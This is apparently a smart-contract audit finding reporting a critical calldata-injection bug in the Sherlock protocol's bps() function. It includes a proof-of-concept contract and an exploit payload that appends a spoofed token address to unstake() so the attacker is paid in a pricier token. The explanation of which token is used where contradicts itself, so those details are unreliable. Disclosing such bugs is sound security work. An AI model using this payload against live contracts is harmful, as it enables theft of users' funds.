## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [[Bug] A critical bug in bps function](https://github.com/code-423n4/2021-07-sherlock-findings/issues/90) 

# Handle

hrkrshnn


# Vulnerability details

## A critical bug in bps function: PoolBase.sol

``` solidity
function bps() internal pure returns (IERC20 rt) {
  // These fields are not accessible from assembly
  bytes memory array = msg.data;
  uint256 index = msg.data.length;

  // solhint-disable-next-line no-inline-assembly
  assembly {
    // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.
    rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)
  }
}
```

The above function is designed to expect the token at the end of
`calldata`, but a malicious user can inject extra values at the end of
`calldata` and fake return values.

The following contract demonstrates an example:

``` solidity
pragma solidity 0.8.6;

interface IERC20 {}

error StaticCallFailed();

contract BadEncoding {
    /// Will return address(1). But address(0) is expected!
    function f() external view returns (address) {
        address actual = address(0);
        address injected = address(1);

        (bool success, bytes memory ret) = address(this).staticcall(abi.encodeWithSelector(this.g.selector, actual, injected));

        if (!success) revert StaticCallFailed();

        return abi.decode(ret, (address));
    }
    function g(IERC20 _token) external pure returns (IERC20) {
        // to get rid of the unused warning
        _token;
        // Does it always match _token?
        return bps();
    }
    // From Sherlock Protocol: PoolBase.sol
    function bps() internal pure returns (IERC20 rt) {
        // These fields are not accessible from assembly
        bytes memory array = msg.data;
        uint256 index = msg.data.length;

        // solhint-disable-next-line no-inline-assembly
        assembly {
            // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.
            rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)
        }
    }
}
```

### An example exploit

This can be used to exploit the protocol:

``` solidity
function unstake(
  uint256 _id,
  address _receiver,
  IERC20 _token
) external override returns (uint256 amount) {
  PoolStorage.Base storage ps = baseData();
  require(_receiver != address(0), 'RECEIVER');
  GovStorage.Base storage gs = GovStorage.gs();
  PoolStorage.UnstakeEntry memory withdraw = ps.unstakeEntries[msg.sender][_id];
  require(withdraw.blockInitiated != 0, 'WITHDRAW_NOT_ACTIVE');
  // period is including
  require(withdraw.blockInitiated + gs.unstakeCooldown < uint40(block.number), 'COOLDOWN_ACTIVE');
  require(
    withdraw.blockInitiated + gs.unstakeCooldown + gs.unstakeWindow >= uint40(block.number),
    'UNSTAKE_WINDOW_EXPIRED'
  );
  amount = withdraw.lock.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());

  ps.stakeBalance = ps.stakeBalance.sub(amount);
  delete ps.unstakeEntries[msg.sender][_id];
  ps.lockToken.burn(address(this), withdraw.lock);
  _token.safeTransfer(_receiver, amount);
}
```

State token `Token1`. Let's say there is a more expensive token
`Token2`.

Here's an example exploit:

``` solidity
bytes memory exploitPayload = abi.encodeWithSignature(
    PoolBase.unstake.selector,
    (uint256(_id), address(_receiver), address(Token2), address(Token1))
);
poolAddress.call(exploitPayload);
```

All the calculations on `ps` would be done on `Token2`, but at the end,
because of, `_token.safeTransfer(_receiver, amount);`, `Token2` would be
transferred. Assuming that `Token2` is more expensive than `Token1`, the
attacker makes a profit.

Similarly, the same technique can be used at a lot of other places. Even
if this exploit is not profitable, the fact that the computations can be
done on two different tokens is buggy.

There are several other places where the same pattern is used. All of
them needs to be fixed. I've not written an exhaustive list.


